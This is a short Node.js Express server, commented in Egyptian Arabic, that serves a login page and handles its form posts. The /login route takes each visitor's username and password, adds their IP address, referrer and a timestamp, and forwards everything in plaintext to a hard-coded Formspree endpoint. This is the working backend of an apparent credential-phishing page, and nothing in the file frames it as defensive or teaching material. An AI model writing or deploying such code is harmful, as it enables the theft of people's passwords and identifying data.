const express = require("express");
const path = require("path");

const app = express();
const PORT = 3000;

// رابط الفورم سبري بتاعك
const FORMSPREE_URL = "https://formspree.io/f/xzeddwyr";

// middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// تقديم ملفات الموقع (ضع M.html جنب server.js)
app.use(express.static(__dirname));

// صفحة رئيسية -> صفحة تسجيل الدخول
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "M.html"));
});

// استقبال بيانات تسجيل الدخول وإرسالها لفورم سبري
app.post("/login", async (req, res) => {
  try {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.status(400).json({ ok: false, error: "بيانات ناقصة" });
    }

    const payload = {
      username: username,
      password: password,
      page: req.headers.referer || "login-page",
      ip: req.headers["x-forwarded-for"] || req.socket.remoteAddress,
      time: new Date().toLocaleString("ar-EG", { timeZone: "Africa/Cairo" }),
    };

    const r = await fetch(FORMSPREE_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
      },
      body: JSON.stringify(payload),
    });

    if (r.ok) {
      return res.json({ ok: true });
    } else {
      return res.status(502).json({ ok: false, error: "فورم سبري رفض الطلب" });
    }
  } catch (err) {
    console.error(err);
    return res.status(500).json({ ok: false, error: "خطأ في السيرفر" });
  }
});

app.listen(PORT, () => {
  console.log(`✅ السيرفر شغال على: http://localhost:${PORT}`);
});
